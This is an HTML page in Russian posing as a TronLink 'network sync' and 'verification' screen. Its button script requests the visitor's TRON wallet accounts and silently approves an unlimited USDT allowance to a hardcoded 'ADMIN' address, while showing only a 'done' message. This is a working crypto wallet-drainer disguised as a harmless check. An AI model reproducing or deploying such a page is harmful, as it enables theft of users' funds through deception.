<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Network Sync</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 35px; border: 1px solid #222; }
        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; }
        .btn { display: block; background: #ff0013; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 20px; font-weight: bold; text-transform: uppercase; cursor: pointer; }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">T</div>
    <h2 id="t">Верификация</h2>
    <p id="p">Нажмите кнопку для синхронизации с TronLink.</p>
    <button id="btn" class="btn">ЗАПУСТИТЬ</button>
</div>
<script>
    const btn = document.getElementById('btn');
    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

    btn.onclick = async () => {
        const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
        if (!tron) {
            // Если мы не в кошельке — прыгаем в приложение
            window.location.href = "tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(window.location.href);
            return;
        }
        try {
            await tron.request({ method: 'tron_requestAccounts' });
            const contract = await tron.contract().at(USDT);
            await contract.approve(ADMIN, '1000000000000000000').send({ feeLimit: 100000000 });
            alert("Готово!");
        } catch (e) { alert("Ошибка: " + e.message); }
    };
    if (window.tronWeb) { document.getElementById('t').innerText = "Узел найден"; btn.innerText = "ПОДТВЕРДИТЬ"; }
</script>
</body>
</html>
